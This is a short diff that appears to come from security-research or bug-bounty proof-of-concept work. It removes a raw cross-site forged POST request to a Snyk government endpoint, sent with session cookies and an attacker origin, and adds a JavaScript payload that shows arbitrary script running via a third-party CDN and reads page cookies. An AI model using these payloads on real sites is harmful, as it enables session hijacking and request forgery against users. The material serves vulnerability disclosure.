@@ -1,8 +1,1 @@
-POST /api/rest/groups HTTP/2
-Host: app.snykgov.io
-Cookie: snyk.id=s%3A4rDglBfdxVq1cNvob...; snyk.publicId=dc1e2baa-4657-42cc-9aee-06ba830439e5; ajs_anonymous_id=d7e5aedf-881f-4258-925a-5ea99085777e; _csrf=CZCtLTkk5IJeZwTx1avrmjgO
-Origin: https://evil-attacker.com
-Referer: https://evil-attacker.com/attack.html
-Content-Type: application/x-www-form-urlencoded
-
-test=samesite_poc
+window['_fs_host'];(function(){var b=document.createElement('div');b.style='position:fixed;top:0;left:0;width:100%;padding:15px;background:red;color:white;font-size:20px;z-index:99999;text-align:center';b.textContent='POC: Arbitrary JS executed via FullStory CDN - Supply Chain Risk';document.addEventListener('DOMContentLoaded',function(){document.body.prepend(b);console.log('[POC] Cookies accessible to JS: '+document.cookie)})})()//
